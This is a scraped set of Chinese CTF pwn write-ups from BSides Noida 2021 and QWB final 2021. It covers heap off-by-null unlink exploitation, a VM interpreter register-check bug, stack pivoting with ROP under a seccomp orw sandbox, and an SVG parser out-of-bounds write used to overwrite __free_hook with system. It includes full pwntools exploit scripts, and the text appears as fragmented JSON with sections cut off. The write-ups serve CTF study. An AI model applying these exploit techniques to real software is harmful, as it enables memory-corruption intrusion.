0x000015555517b0a5 \u003c+5\u003e: lea rsi,[rdi+0x128] 0x000015555517b0ac \u003c+12\u003e: xor edx,edx 0x000015555517b0ae \u003c+14\u003e: mov edi,0x2 0x000015555517b0b3 \u003c+19\u003e: mov r10d,0x8 0x000015555517b0b9 \u003c+25\u003e: mov eax,0xe 0x000015555517b0be \u003c+30\u003e: syscall 0x000015555517b0c0 \u003c+32\u003e: pop rdx 0x000015555517b0c1 \u003c+33\u003e: cmp rax,0xfffffffffffff001 0x000015555517b0c7 \u003c+39\u003e: jae 0x15555517b1ef \u003csetcontext+335\u003e 0x000015555517b0cd \u003c+45\u003e: mov rcx,QWORD PTR [rdx+0xe0] 0x000015555517b0d4 \u003c+52\u003e: fldenv [rcx] 0x000015555517b0d6 \u003c+54\u003e: ldmxcsr DWORD PTR [rdx+0x1c0] 0x000015555517b0dd \u003c+61\u003e: mov rsp,QWORD PTR [rdx+0xa0] 0x000015555517b0e4 \u003c+68\u003e: mov rbx,QWORD PTR [rdx+0x80] 0x000015555517b0eb \u003c+75\u003e: mov rbp,QWORD PTR [rdx+0x78] 0x000015555517b0ef \u003c+79\u003e: mov r12,QWORD PTR [rdx+0x48] 0x000015555517b0f3 \u003c+83\u003e: mov r13,QWORD PTR [rdx+0x50] 0x000015555517b0f7 \u003c+87\u003e: mov r14,QWORD PTR [rdx+0x58] 0x000015555517b0fb \u003c+91\u003e: mov r15,QWORD PTR [rdx+0x60] 0x000015555517b0ff \u003c+95\u003e: test DWORD PTR fs:0x48,0x2 所以核心思路是off-by-null使chunk的inuse位置0，标志着前一个chunk使空闲的，导致在free当前chunk时触发unlink向前合并。在前一个块精心布局绕过unlink检查，我们就可以向前合并导致堆块重叠。可以直接动态调试绕过unlink检测。 0x1555551bba41 \u003cunlink_chunk.isra+33\u003e cmp rdi, qword ptr [rax + 0x18] 0x1555551bba45 \u003cunlink_chunk.isra+37\u003e jne unlink_chunk.isra+160 \u003cunlink_chunk.isra+160\u003e ► 0x1555551bba47 \u003cunlink_chunk.isra+39\u003e cmp rdi, qword ptr [rdx + 0x10] 0x1555551bba4b \u003cunlink_chunk.isra+43\u003e jne unlink_chunk.isra+160 \u003cunlink_chunk.isra+160\u003e 0x1555551bbac0 \u003cunlink_chunk.isra+160\u003e lea rdi, [rip + 0x11f990] 0x1555551bbac7 \u003cunlink_chunk.isra+167\u003e call malloc_printerr \u003cmalloc_printerr\u003e # unlink 出错 堆块合并拿到libc基址后，直接分配到environ去泄露stack地址，还是因为有个\\x00 看来还得打stdout拿到栈地址，我们知道在IO FILE的flag为某些值时write_base到write_end会打印出来。所以打到stdout，利用write_base拿到栈地址。然后去做栈溢出。 这里发现stdout本身的flag不对，还得从头开始改，这样如果只改一半它在刚分配过去的时候会全部清零引发错误，所以必须得足够大的块一次性把整个stdout伪造出来(只把write指针全改也不行) exp2.31，加上mask异或就能打远程。总的来说细节还是比较繁琐。 \"\"\" x1do0 / Lilac \"\"\" from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') # context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] def choice(ch): io.sendlineafter(\"\u003e \", str(ch)) def add(idx, size, con): choice(1) io.sendlineafter(\"Trashcan no.: \", str(idx)) io.sendlineafter(\"Size of your trash: \", str(size)) io.sendafter(\"Your trash: \", con) def change_size(idx, size): choice(2) io.sendlineafter(\"Trashcan no.: \", str(idx)) io.sendlineafter(\"Size of new trashcan:\", str(size)) def show(idx): choice(3) io.sendlineafter(\"Trashcan no.: \", str(idx)) debug = \"\" # debug += \"b *0x43BB + 0x555555554000\" # debug += \"\\nset $data=0x55555555d4d0\" # debug += \"\\nb *0x1555551bba41\" # unlink check debug += \"\\nb *0x46E5 + 0x555555554000\" io = process(\"./a.out\") choice(0x7A69) io.recvuntil(\"what happened\\n\") heap_addr = int(io.recv(14), 16) print('[*] heap addr : ' + hex(heap_addr)) add(0, 0x78, 'a\\n') add(2, 0x18, 'c\\n') add(12, 0x58, 'd\\n') add(1, 0xf8, 'b\\n') change_size(0,","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:7:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"Interpreter C++实现的vmpwn，逆指令就完事了。 op reg1 [reg2] [reg3] opcode operations c ip+=2, r ip+=3, byte v13[reg1] = byte v14[ short v13[reg2] ] w ip+=3, byte v14[ short v13[reg1] ] = byte v13[reg2] a ip+=4, byte v13[reg1] = byte v13[reg2] + byte v13[reg3] d ip+=4, byte v13[reg1] = short v13[reg2] / short v13[reg3] m ip+=4, byte v13[reg1] = byte v13[reg2] * byte v13[reg3] s ip+=4, byte v13[reg1] = byte v13[reg2] - byte v13[reg3] 在解析指令时有明显的逻辑漏洞，本意是只有0-3个寄存器，但是只要不都大于3就不会报错 opcode = code[currentIP] | 0x20; _reg2 = currentIP + 2; reg1 = code[currentIP + 1] - 0x30; if ( opcode == 'c' ) { currentIP += 2; } else { v10 = currentIP + 3; reg2 = code[_reg2] - '0'; if ( opcode != 'r' \u0026\u0026 opcode != 'w' ) { currentIP += 4; reg3 = code[v10] - '0'; } else { currentIP += 3; } if ( (unsigned __int8)(code[_reg2] - '0') \u003e 3u \u0026\u0026 reg1 \u003e 3u \u0026\u0026 reg3 \u003e 3u )// opcode \u003c=3 \u003c=3 \u003c=3 { // 逻辑漏洞 std::operator\u003c\u003c\u003cstd::char_traits\u003cchar\u003e\u003e(\u0026std::cerr, \"Invalid Register\\n\"); exit(-1); } } 所以能以v13为base，以任意一字节为offset，进行读写等操作。 __int64 __fastcall main_core(const char *code) { int code_len; // er15 unsigned __int8 reg3; // r13 char reg2; // r14 char v5; // cl int currentIP; // ebp char opcode; // al int _reg2; // esi unsigned __int8 reg1; // bl int v10; // edi int i; // edx __int64 v13; // [rsp+8h] [rbp-A0h] __int64 v14[7]; // [rsp+10h] [rbp-98h] int v15; // [rsp+48h] [rbp-60h] char v16[24]; // [rsp+50h] [rbp-58h] BYREF unsigned __int64 v17; // [rsp+68h] [rbp-40h] 把v14改成3p1cl337-k3yw0rd就能拿到re的flag（flag1.txt） pwn题要求拿到flag2.txt，在函数sub_2B47()，c++很难辨认，但是还是能依稀看出open了flag2.txt，并且该函数没有被任何函数调用。 unsigned __int64 sub_2B47() { std::ostream *v0; // rbx char *v1; // rcx _BYTE *v2; // rbp char v3; // si std::ostream *v4; // rax void *v6; // [rsp+0h] [rbp-248h] BYREF __int64 v7; // [rsp+8h] [rbp-240h] __int64 v8[2]; // [rsp+10h] [rbp-238h] BYREF int *v9; // [rsp+20h] [rbp-228h] BYREF __int64 v10; // [rsp+28h] [rbp-220h] __int64 v11[7]; // [rsp+30h] [rbp-218h] BYREF char v12[48]; // [rsp+68h] [rbp-1E0h] BYREF char v13[136]; // [rsp+98h] [rbp-1B0h] BYREF __int64 v14[28]; // [rsp+120h] [rbp-128h] BYREF char v15; // [rsp+200h] [rbp-48h] char v16; // [rsp+201h] [rbp-47h] __int64 v17; // [rsp+208h] [rbp-40h] __int64 v18; // [rsp+210h] [rbp-38h] __int64 v19; // [rsp+218h] [rbp-30h] __int64 v20; // [rsp+220h] [rbp-28h] unsigned __int64 v21; // [rsp+228h] [rbp-20h] v21 = __readfsqword(0x28u); std::__ostream_insert\u003cchar,std::char_traits\u003cchar\u003e\u003e(std::cout, \"Nice Job\\n\", 9LL); std::ios_base::ios_base((std::ios_base *)v14); v14[0] = (__int64)\u0026unk_4C40; v14[27] = 0LL; v15 = 0; v16 = 0; v17 = 0LL; v18 = 0LL; v19 = 0LL; v20 = 0LL; v9 = \u0026dword_0; *(int **)((char *)\u0026v9 + MEMORY[0xFFFFFFFFFFFFFFE8]) = \u0026dword_0; v10 = 0LL; std::ios::init((char *)\u0026v9 + *((_QWORD *)v9 - 3), 0LL); v9 = (int *)\u0026unk_4CE8; v14[0] = (__int64)\u0026unk_4CE8 + 40; std::filebuf::basic_filebuf(v11); std::ios::init(v14, v11); if ( std::filebuf::open(v11, \"flag2.txt\", 8LL) ) std::ios::clear((char *)\u0026v9 + *((_QWORD *)v9 - 3), 0LL); else std::ios::clear((char *)\u0026v9 + *((_QWORD *)v9 - 3), *(_DWORD *)((char *)\u0026v9 + *((_QWORD *)v9 - 3) + 32) | 4u); v6 = v8; v7 = 0LL; LOBYTE(v8[0]) = 0; std::operator\u003e\u003e\u003cchar\u003e(\u0026v9, \u0026v6); std::__ostream_insert\u003cchar,std::char_traits\u003cchar\u003e\u003e(std::cout, \"Here's your second reward : \", 28LL); v0 = (std::ostream *)std::__ostream_insert\u003cchar,std::char_traits\u003cchar\u003e\u003e(std::cout, v6, v7); v1 = (char *)v0 + *(_QWORD *)(*(_QWORD *)v0 - 24LL); v2 = (_BYTE *)*((_QWORD *)v1 + 30); if ( !v2 ) std::__throw_bad_cast(); if ( v2[56] ) { v3 = v2[67]; } else { std::ctype\u003cchar\u003e::_M_widen_init(*((_QWORD *)v1 + 30)); v3 = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)v2 + 48LL))(v2, 10LL); } v4 = (std::ostream *)std::ostream::put(v0, v3); std::ostream::flush(v4); if ( v6 != v8 ) operator delete(v6, v8[0] + 1); v9 = (int *)\u0026unk_4CE8; v14[0] = (__int64)\u0026unk_4CE8 + 40; v11[0] = (__int64)\u0026unk_4D30; std::filebuf::close(v11); std::__basic_file\u003cchar\u003e::~__basic_file(v13); v11[0] = (__int64)\u0026unk_4C60; std::locale::~locale((std::locale *)v12); v9 = ","date":"2021-08-18","objectID":"/2021/08/bsides-noida-ctf-2021/:8:0","tags":null,"title":"BSides Noida CTF 2021","uri":"/2021/08/bsides-noida-ctf-2021/"},{"categories":["PWN"],"content":"国内最受瞩目的比赛之一，拥有几乎最高的PWN/realworld赛题质量。 比赛时看了几道cold down, EXSI找到了洞但是不好复现… easy_go vmnote s2a 强网先锋 EXSI (Real World) rank 3 with AAA ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:0:0","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"强网先锋 详见前文 ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:1:0","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"easy_go ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:0","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"overall 栈上有明显的off-by-null漏洞，可以修改rbp的低字节，通过两次leave ret来做stack-pivot. __int64 __fastcall sub_4015AB(__int64 a1, int a2) //vul_read() { unsigned int i; // [rsp+1Ch] [rbp-4h] for ( i = 0; (int)i \u003c a2; ++i ) { if ( read(0, (void *)((int)i + a1), 1uLL) \u003c= 0 ) { puts(\"read error\"); exit(0); } if ( *(_BYTE *)((int)i + a1) == 10 ) break; } *(_BYTE *)((int)i + a1) = 0; // off-by-one return i; } 同时题目开启sandbox，只允许orw x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ seccomp-tools dump ./easy_go line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0018: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0020: 0x06 0x00 0x00 0x00000000 return KILL ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:1","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Tips 赛题环境ubuntu20.04，建议同版本调试 x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ diff /usr/lib/x86_64-linux-gnu/libc-2.31.so ./libc-2.31.so x1do0@x1do0:/mnt/hgfs/linux_share/qwb_final/easy_go$ 调试时别忘了打开系统aslr ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:2","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Details 由于栈随机化现象，需要多尝试几次，在某一次可以跑到如下RSP与RBP，看到RBP正好成了用户可控区域。 此时直接调用vul_read()，十分幸运地是此时rdi与rsi都是合法的，同时rdi正好在当前栈附件，rsi也足够大。 ────────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────────── RAX 0x0 RBX 0x401740 ◂— endbr64 RCX 0x0 RDX 0xa RDI 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0 RSI 0x7fa550e463c0 (_nl_C_LC_CTYPE_class+256) ◂— 0x2000200020002 R8 0x7fa550e934a0 (_nl_global_locale) —▸ 0x7fa550e8f6c0 (_nl_C_LC_CTYPE) —▸ 0x7fa550e5ffc6 (_nl_C_name) ◂— 0x636d656d5f5f0043 /* 'C' */ R9 0x18 R10 0x402061 ◂— 'continue?(0:no, 1:yes): ' R11 0x246 R12 0x401190 ◂— endbr64 R13 0x7ffce71cf730 ◂— 0x1 R14 0x0 R15 0x0 RBP 0x404800 ◂— 0x0 *RSP 0x7ffce71cf610 —▸ 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0 *RIP 0x40168d ◂— call 0x4015ab ─────────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────────── 0x401717 leave 0x401718 ret ↓ ► 0x40168d call 0x4015ab \u003c0x4015ab\u003e 0x401692 lea rax, [rbp - 0x10] 0x401696 lea rsi, [rip + 0x9ac] 0x40169d mov rdi, rax 0x4016a0 call strcmp@plt \u003cstrcmp@plt\u003e 0x4016a5 test eax, eax 0x4016a7 jne 0x4016b0 \u003c0x4016b0\u003e 0x4016a9 mov eax, 0 0x4016ae jmp 0x4016cd \u003c0x4016cd\u003e ──────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────── 00:0000│ rsp 0x7ffce71cf610 —▸ 0x7ffce71cf600 —▸ 0x404800 ◂— 0x0 01:0008│ 0x7ffce71cf618 —▸ 0x401707 ◂— mov dword ptr [rbp - 4], eax 02:0010│ 0x7ffce71cf620 —▸ 0x7ffce71cf630 —▸ 0x7ffce71cf640 ◂— 0x0 03:0018│ 0x7ffce71cf628 —▸ 0x40159a ◂— test eax, eax 04:0020│ 0x7ffce71cf630 —▸ 0x7ffce71cf640 ◂— 0x0 05:0028│ 0x7ffce71cf638 —▸ 0x401735 ◂— mov eax, 0 06:0030│ 0x7ffce71cf640 ◂— 0x0 07:0038│ 0x7ffce71cf648 —▸ 0x7fa550cce0b3 (__libc_start_main+243) ◂— mov edi, eax ────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────── ► f 0 0x40168d f 1 0x0 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── pwndbg\u003e 接下来就是ROP了，并且溢出大小完全够用，我们选择溢出修改这次调用的vul_read()的返回地址。 以下payload便是第一轮ROP链，能通过stdout地址leak libc并重新返回到main函数进行下一次ROP。 p.sendafter(\"client send \u003e\u003e \", \"A\" * 0x10) p.sendafter(\"continue?(0:no, 1:yes): \", p64(0x404500) + p64(0x40168d)) pop_rsi_r15 = 0x4017a1 # pop rsi ; pop r15 ; ret pop_rdi = 0x4017a3 # pop rdi ; ret printf_plt = 0x401100 stdout = 0x404020 empty_ret = 0x40101a main_fucntion = 0x4016CF padding = 0x8 payload = b\"A\" * padding payload += flat([pop_rdi, stdout, empty_ret, printf_plt]) payload += p64(empty_ret) + p64(main_fucntion) # sleep(1) p.sendline(payload) 最终exp如下，需要多跑几次 #!/usr/bin/env python # -*- coding: utf-8 -*- \"\"\" dydxh / AAA \"\"\" from pwn import * import sys, os, re context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] # p = remote('172.20.5.31', 22423) p = process(\"./easy_go\") def exploit() : # beautyexp.hook(p) # init_connect() # gdb.attach(p, \"b *0x0401717\") p.sendafter(\"client send \u003e\u003e \", \"A\" * 0x10) p.sendafter(\"continue?(0:no, 1:yes): \", p64(0x404500) + p64(0x40168d)) pop_rsi_r15 = 0x4017a1 # pop rsi ; pop r15 ; ret pop_rdi = 0x4017a3 # pop rdi ; ret printf_plt = 0x401100 stdout = 0x404020 empty_ret = 0x40101a main_fucntion = 0x4016CF padding = 0x8 payload = b\"A\" * padding payload += flat([pop_rdi, stdout, empty_ret, printf_plt]) payload += p64(empty_ret) + p64(main_fucntion) # sleep(1) p.sendline(payload) msg = p.recvuntil('\\x7f').ljust(8, b'\\x00') libc_addr = u64(msg) - 0x1ec6a0 print(\"libc addr: 0x{:x}\".format(libc_addr)) input() environ_addr = libc_addr + 0x1ef2e0 pop_rax = libc_addr + 0x4a550 # pop rax ; ret pop_rdx_r12 = libc_addr + 0x11c371 # pop rdx ; pop r12 ; ret syscall_addr = libc_addr + 0x2584d # syscall p.sendafter(\"client send \u003e\u003e \", b\"A\" * 0x10) p.sendafter(\"continue?(0:no, 1:yes): \", p64(0x404500) + p6","date":"2021-07-15","objectID":"/2021/07/qwb2021/:2:3","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"s2a ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:3:0","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Overall 这是一个svg解析器（语法类似于xml），可以将用户输入的svg文件解析并打印出图像。 '1. New picture.\\n' '2. Show picture.\\n' '3. Delete picture.\\n' 漏洞点在于没有边界检查，在show功能中有以下代码片段，会将所有\u003cpath\u003e标签依次解析，找到其指定的位置，赋予颜色。buf为二维动态数组，两个维度的idx都没有大小检测，使利用变得简单。 do { if ( (v7-\u003etype \u0026 0xFD) == 4 ) { v8 = (path_attr *)v7-\u003eattr; if ( v8 ) { v9 = (path_node *)v8-\u003epath; if ( v8-\u003epath ) { color = v8-\u003estroke_color; buf[v9-\u003ex][v9-\u003ey + 1] = color; // forget to check x, y for ( ptr = v9-\u003enext; ptr; buf[next_x][next_y + 1] = color ) { next_x = ptr-\u003ex; next_y = ptr-\u003ey; ptr = ptr-\u003enext; } } } } v7 = v7-\u003eend_node; } while ( v7 ); ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:3:1","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Details 该二维数组由malloc再malloc实现，只要在堆上找到buf后面的libc相关地址（比如free过的unsorted bin地址），在一维解析时就可以弄到libc那边，再在二维解析时调整偏移。由于颜色是用户可控的，所以可以在libc地址进行任意次任意地址写。 buf = (char **)malloc(8 * v3); if ( (_DWORD)v3 ) { i = 0LL; *buf = (char *)malloc(cvs_width + 2); ... 可以先修改stdout的write_base来泄露libc地址，然后改free_hook为system地址提权。 exp如下（ubt20.04，原题版本18.04） #!/usr/bin/env python # -*- coding: utf-8 -*- \"\"\" N0p / AAA \"\"\" from pwn import * import sys, os, re context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h', '-p', '75'] p = process(\"../s2a\", aslr=False) libc = ELF(\"../s2a\").libc # p = remote('172.20.5.31', 11002) def recvptr(self): return u64(self.recvn(6).ljust(8, b\"\\x00\")) pwnlib.tubes.remote.remote.recvptr = recvptr pwnlib.tubes.process.process.recvptr = recvptr def chose(n): p.sendlineafter(\"choice:\", str(n)) def add(a0=\"0\", a1=\"\u003csvg\u003eAAA\u003c/svg\u003e\"): chose(\"1\") p.sendafter(\"idx:\", (str(a0)+\"\\n\")[:]) p.sendafter(\"Input:\", (str(a1)+\"\\n\")[:]) def show(a0=\"0\"): chose(\"2\") p.sendafter(\"idx:\", (str(a0)+\"\\n\")[:]) def delete(a0=\"0\"): chose(\"3\") p.sendafter(\"idx:\", (str(a0)+\"\\n\")[:]) with open(\"test.svg\", \"rb\") as fp: data = fp.read() with open(\"test2.svg\", \"rb\") as fp: data2 = fp.read() with open(\"test3.svg\", \"rb\") as fp: data3 = fp.read() with open(\"test4.svg\", \"rb\") as fp: data4 = fp.read() #0x555555554000+0x7846 # bps.append(\"*0x555555554000+0x779E\") add(0, data) add(1, data2) add(2, data3) show(2) add(3, data2) add(4, data) delete(3) delete(1) show(0) p.recvn(9) libc.addr = p.recvptr() - 0x1eb980 free_hook = libc.addr + libc.sym['__free_hook'] magic_addr = libc.addr + libc.sym['system'] print(hex(libc.addr)) print(hex(free_hook)) print(hex(magic_addr)) delete(0) data5 = \"\"\"\u003csvg width=\"4\" height=\"4\" viewBox=\"0 0 4 4\"\u003e\\n\"\"\" for i in range(6): x = '\u003cpath d=\"M{},110\" stroke=\"#{}\"/\u003e\\n'.format(0x2aa7+i, (hex(magic_addr \u0026 0xff)[2:])*3) data5 += x magic_addr \u003e\u003e= 8 data5 += \"\"\"\u003c/svg\u003e\"\"\" add(0, data5) # gdb.attach(p, \"b *0x555555554000+0x7846\") show(0) delete(0) add(0, '\u003ccat flag;\\x00\u003e') # print(p.recvline()) # p.close() p.interactive() /test.svg \u003csvg width=\"4\" height=\"4\" viewBox=\"0 0 4 4\"\u003e \u003cpath d=\"M2752,110\"/\u003e \u003cpath d=\"M2752,110\" stroke=\"#181818\"/\u003e \u003cpath d=\"M2783,110\"/\u003e \u003c/svg\u003e /test2.svg \u003csvg version=\"111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\" width=\"800\" height=\"800\" viewBox=\"0 0 800 800\"\u003e \u003cpath d=\"M1,1\"/\u003e \u003c/svg\u003e /test3.svg \u003csvg width=\"4\" height=\"4\" viewBox=","date":"2021-07-15","objectID":"/2021/07/qwb2021/:3:2","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"vmnote ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:0","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Overall vmpwn，实现了自己的指令集，并且在note.bin中用自己的指令集写了一个菜单。但漏洞不在菜单里，还是在指令上。在读size或者读idx的时候会有一个off-by-null，在虚拟机内部导致覆盖rbp低字节。 ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:1","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Details 只允许orw x1do0@x1do0:~/linux_share/qwb_final/vmnote/vmnote$ seccomp-tools dump ./vmnote line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x01 0x00 0xc000003e if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x20 0x00 0x00 0x00000000 A = sys_number 0004: 0x15 0x00 0x01 0x0000000f if (A != rt_sigreturn) goto 0006 0005: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0006: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0008 0007: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x15 0x00 0x01 0x00000000 if (A != read) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x15 0x00 0x01 0x00000001 if (A != write) goto 0014 0013: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0014: 0x15 0x00 0x01 0x00000002 if (A != open) goto 0016 0015: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0016: 0x15 0x00 0x01 0x00000101 if (A != openat) goto 0018 0017: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0018: 0x15 0x00 0x01 0x0000000c if (A != brk) goto 0020 0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0020: 0x06 0x00 0x00 0x00000000 return KILL 先提取解析note.bin的指令内容 from pwn import * regs = [0 for i in range(12)] stack = [] global rip, code, data data = [] rip = 0x0 rsp = 0x1000 tmp_rsp = 0 def open_file(): global code, data with open(\"../note.bin\", \"rb\") as f: all_data = f.read() code = all_data[0x10:0x774+0x10] data = all_data[0x774+0x10:] def translate(): global rip, code while True: print(\"label_%x: \" % rip) val = u8(code[rip:rip+1]) rip += 1 types =(val \u003e\u003e 5) \u0026 7 opcode = val \u0026 0x1F if opcode == 0: print(\"push reg[%d]\" % u8(code[rip:rip+1])) rip += 1 elif opcode == 1: if types == 1: print(\"mov reg[%d], word ptr data[reg[%d]]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif types == 3: print(\"mov reg[%d], dword ptr data[reg[%d]]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif types == 4: print(\"mov reg[%d], qword ptr data[reg[%d]]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif opcode == 2: print(\"nop\") rip += 1 elif opcode == 3: reg = u8(code[rip:rip+1]) rip += 1 if types == 0: print(\"read char reg[%d]\" % reg) elif types == 1: print(\"read int reg[%d]\" % reg) elif types == 2: print(\"read long reg[%d]\" % reg) else: print(\"read char data[reg[%d]]\" % reg) elif opcode == 4: print(\"leave\") elif opcode == 5: if types == 1: print(\"sub byte ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 if types == 2: print(\"sub word ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3]))) rip += 1 + 2 elif types == 3: print(\"sub dword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5]))) rip += 1 + 4 elif types == 4: print(\"sub qword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9]))) rip += 1 + 8 else: print(\"sub reg[%d], reg[%d]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif opcode == 6: print(\"nop\") rip += 1 elif opcode == 7: if types == 1: print(\"add byte ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 if types == 2: print(\"add word ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u16(code[rip + 1:rip + 3]))) rip += 1 + 2 elif types == 3: print(\"add dword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5]))) rip += 1 + 4 elif types == 4: print(\"add qword ptr reg[%d], 0x%x\" % (u8(code[rip:rip+1]), u64(code[rip + 1:rip + 9]))) rip += 1 + 8 else: print(\"add reg[%d], reg[%d]\" % (u8(code[rip:rip+1]), u8(code[rip + 1:rip+2]))) rip += 2 elif opcode == 8: reg, idx = u8(code[rip:rip+1]), u32(code[rip + 1:rip + 5]) if types == 1: print(\"mov byte ptr data[0x%x], reg[%d]\" % (idx, reg)) rip += 5 if types == 2: print(\"mov word ptr data[0x%x], reg[%d]\" % (idx, reg)) rip += 5 elif types == 3: print(\"mov dword ptr data[0x%x], reg[%d]\" % (idx, reg)) rip += 5 elif types == 4: print(\"mov qword ptr data[0x%x], reg[%d]\" % ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:2","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Tips 这题有亿点麻烦，由于栈的随机化脸黑的话很难调，但是由于是虚拟指令模拟的栈，所以可以考虑将rand patch掉以便调试。 ","date":"2021-07-15","objectID":"/2021/07/qwb2021/:4:3","tags":null,"title":"Qwb final 2021","uri":"/2021/07/qwb2021/"},{"categories":["PWN"],"content":"Overall 